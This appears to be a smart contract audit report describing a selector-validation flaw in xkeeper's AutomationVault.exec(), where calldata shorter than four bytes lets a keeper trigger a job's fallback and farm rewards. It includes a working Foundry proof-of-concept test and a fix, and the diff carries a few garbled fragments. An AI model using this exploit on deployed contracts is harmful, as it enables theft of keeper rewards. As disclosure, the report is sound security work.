Colossal Rose Jaguar

medium

# Keepers can execute the `fallback` method even if it's not one of the approved selectors for that job.

## Summary
Because `_dataToExecute.jobData` is explicitly converted to `bytes4` in `AutomationVault.exec()`, the keeper can call the fallback method of the job contract even if it's not an approved job selector. This allows the keeper to repeatedly invoke the fallback method to farm rewards from that job.

## Vulnerability Detail
Each job configured in the `AutomationVault` contract can have one or more approved selectors that the keeper can call. Below is a snippet from the `AutomationVault.exec()` function where the selectors are validated. First, it converts `_dataToExecute.jobData` to `bytes4` and checks if it matches one of the allowed selectors. If it does, the function proceeds to call that job contract with `_dataToExecute.jobData` as calldata.

```solidity
      // Check that the selector is approved to be called
      if (!_approvedJobSelectors[msg.sender][_dataToExecute.job].contains(bytes4(_dataToExecute.jobData))) {
        revert AutomationVault_NotApprovedJobSelector();
      }
      (_success,) = _dataToExecute.job.call(_dataToExecute.jobData);
      if (!_success) revert AutomationVault_ExecFailed();
```

However, the code assumes that `bytes4(_dataToExecute.jobData)` and `_dataToExecute.jobData` are equal, which is not always the case. If `_dataToExecute.jobData` is smaller than 4 bytes, the explicit conversion to `bytes4` will pad it with zero bytes, making `bytes4(_dataToExecute.jobData)` not equal to `_dataToExecute.jobData`.

Consider this example: for a specified job, the approved selector is `0x8df82800` (for the `settle(uint256)` function). If the keeper sends the malformed `0x8df828` as `_dataToExecute.jobData`, the selector validation will succeed, but when the job contract is called, no function selector will match `0x8df828`, causing the fallback method (if it exists) to be executed. Thus, the fallback method can be called even though it was never approved for that job.

This issue can be exploited under two conditions:
- One of the approved function selectors for that job must have one or more`0x00` trailing bytes.
- There must be a fallback method on the job contract.

Considering the uniform distribution of function selectors (a fair assumption given they are the output of keccak256), the first condition will be met in approximately 0.39% of all approved selectors (1 trailing `0x00` byte (1/256) + 2 trailing `0x00` bytes (1/65536) + ... ). Although the probabilities are low, as the `AutomationVault` is supposed to be a general keeper aggregator, these situations will arise and potentially be exploited.

By exploiting this issue, a malicious keeper can call `AutomationVault.exec()` without actually executing the intended job and instead only calling the `fallback` method, yet still receiving rewards. This can be done repeatedly to farm rewards from that job. If the fallback method also has negative side effects on the job, they can also be exploited by the malicious keeper.

See the POC below. To run the POC apply the diff patch below and run the following `test_POC` test.

```diff
diff --git a/xkeeper-core/solidity/test/integration/OpenRelay.t.sol b/xkeeper-core/solidity/test/integration/OpenRelay
.t.sol--
index 7b40c3b..fac6c2b 100644
--- a/xkeeper-core/solidity/test/integration/OpenRelay.t.sol
+++ b/xkeeper-core/solidity/test/integration/OpenRelay.t.sol
@@ -5,7 +5,25 @@ import {CommonIntegrationTest} from '../integration/Common.t.sol';
 
 import {IAutomationVault} from '../../interfaces/core/IAutomationVault.sol';
 
+contract Job {
+  event Settled();
+  event Fallback();
+
+  function settle(uint256) external {
+    // Do stuff
+    emit Settled();
+  }re--
+
+  fallback() external payable {
+    emit Fallback();
+  }re--
+}More--
+
+
 contract IntegrationOpenRelay is CommonIntegrationTest {
+
+  event Fallback();
+
   function setUp() public override {
     // AutomationVault setup
     CommonIntegrationTest.setUp();
@@ -32,6 +50,38 @@ contract IntegrationOpenRelay is CommonIntegrationTest {
     changePrank(bot);
   }
 
+  function test_POC() public {
+    // Start of setup
+    Job jobContract = new Job();
+
+    address[] memory _bots = new address[](1);
+    _bots[0] = bot;
+
+    bytes4[] memory _jobSelectors = new bytes4[](1);
+    // 0x8df82800 -> bytes4(keccak256(abi.encode("settle(uint256)")))
+    _jobSelectors[0] = bytes4(0x8df82800);
+
+    IAutomationVault.JobData[] memory _jobsData = new IAutomationVault.JobData[](1);
+    _jobsData[0] = IAutomationVault.JobData(address(jobContract), _jobSelectors);
+
+    changePrank(owner);
+    automationVault.modifyRelay(address(openRelay), _bots, _jobsData);
+    address(automationVault).call{value: 100 ether}('');
+
+    changePrank(bot);
+    // End of setup
+
+    IAutomationVault.ExecData[] memory _execData = new IAutomationVault.ExecData[](1);
+    // Malformed selector to trigger the execution of the fallback method;
+    bytes3 selector = bytes3(0x8df828);
+    _execData[0] = IAutomationVault.ExecData(address(jobContract), abi.encodePacked(selector));
+
+    // Check that the fallback method was executed instead of the settle(uint256) function.
+    vm.expectEmit(address(jobContract));
+    emit Fallback();
+    openRelay.exec(automationVault, _execData, bot);
+  }re--
+
```

## Impact
For jobs that match both conditions described above, the keeper can execute the `fallback` method despite it not being listed in the allowed selectors. This enables the keeper to farm rewards from that job or potentially trigger unintended side-effects from the `fallback` function.

## Code Snippet
https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/core/AutomationVault.sol#L413-L418

## Tool used
Manual Review

## Recommendation
Consider checking that if `_dataToExecute.jobData` is at least 4 bytes long, thus preventing the issue described above from occurring.
